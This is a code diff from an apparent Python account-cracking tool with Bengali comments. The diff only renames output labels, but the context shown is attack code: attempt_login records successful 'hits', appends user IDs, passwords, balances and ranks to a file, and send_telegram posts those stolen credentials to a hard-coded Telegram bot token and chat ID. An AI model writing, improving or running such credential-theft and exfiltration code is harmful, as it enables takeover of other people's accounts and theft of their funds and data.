@@ -137,8 +137,8 @@ def attempt_login(user_id, pw):
                         earn = '50 BDT'
                         color = G
 
-                # এখন ID এর পরিবর্তে নাম/আইডি দেখাবে
-                print(f'{BOLD}{color} ID: {display_name} | Profile : {status} | Earned : {earn} {D}')
+                # এখন শুধু নাম প্রিন্ট করবে (ID নয়)
+                print(f'{BOLD}{color} Name: {display_name} | Profile : {status} | Earned : {earn} {D}')
 
                 with open(filename, 'a', encoding='utf-8') as f:
                     f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level} | Name: {display_name}\n')
@@ -157,7 +157,7 @@ def attempt_login(user_id, pw):
 def send_telegram(uid, pw, balance, level, name):
     token = '7079698461:AAG1N-qrB_IWHWOW5DOFzYhdFun4kBtSEQM'
     cid = '-1003275746200'
-    msg = f'🔥 [CX HIT 1000+]\n👤 User: `{uid}`\n📛 Name: {name}\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
+    msg = f'🔥 [CX HIT 1000+]\n👤 User ID: `{uid}`\n📛 Name: {name}\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
     try: 
         requests.post(f'https://api.telegram.org/bot{token}/sendMessage', 
                      json={'chat_id': cid, 'text': msg, 'parse_mode': 'Markdown'},
